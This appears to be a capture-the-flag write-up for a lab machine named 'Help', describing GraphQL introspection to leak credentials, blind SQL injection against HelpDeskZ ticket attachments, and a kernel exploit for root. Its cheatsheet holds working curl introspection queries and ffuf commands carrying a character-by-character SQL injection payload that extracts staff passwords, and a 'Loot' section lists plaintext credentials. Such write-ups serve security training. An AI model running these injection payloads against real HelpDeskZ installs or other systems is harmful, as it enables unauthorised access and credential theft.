# Help \[Easy]

## Report

A javascript endpoint on port 3000, mentions the use of a query language, upon googling API querying languages, we find documentation for graphQL and retrieve creds. An endpoint 'support' on the main http website is running Helpdeskz, which has two publically available CVEs. The file upload function on submitting a ticket is vulnerable to SQLi which is automated by ffuf to retrieve creds for user flag.

The machine is vulnerable to a kernel level exploit which is found via searchsploit. Compile with gcc to execute binary and become root.

An alternative method involved unauthenticated file inclusion. PHP files were not allowed but remained on the website using a hash of the filename and the timestamp it was uploaded to the server. However, this exploit failed even though we used the exact timestamp instead of guessing within a time interval as the original exploit suggested.

## Cheatsheet

<pre><code>curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { queryType { name, fields { name, description } } } }" }'
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { types { name } } }" }'
<strong>
</strong><strong>curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __type(name: \"User"\) { name fields { name } } }" }'
</strong>curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __type(name: \"User\") { name fields { name } } }" }'

ffuf -u "http://10.10.10.121/support//?v=view_tickets&#x26;action=ticket&#x26;param[]=4&#x26;param[]=attachment&#x26;param[]=1&#x26;param[]=6+and+mid((select+password+from+staff+limit+0,1),1,1)+%3d+'FUZZ'+--+-" -request request.txt -w ../../scripts/smallcharlist.txt -fw 73
#ffuf was reading https from the url why tho
ffuf -u "http://10.10.10.121/support//?v=view_tickets&#x26;action=ticket&#x26;param[]=4&#x26;param[]=attachment&#x26;param[]=1&#x26;param[]=6+and+mid((select+password+from+staff+limit+0,1),HFUZZ,1)+%3d+'WFUZZ'+--+-" -request request.txt -w ../../scripts/num.txt:HFUZZ -w ../../scripts/charlist.txt:WFUZZ -fw 73

ffuf -request request.txt -request-proto http -w ../../scripts/num.txt:HFUZZ -w ../../scripts/charlist.txt:WFUZZ -fw 73
-request-proto specifies what protocol to use - default https which is why the request kept using https

uname -a
</code></pre>

## Loot

### Creds

helpme@helpme.com:godhelpmeplz

help:Welcome1
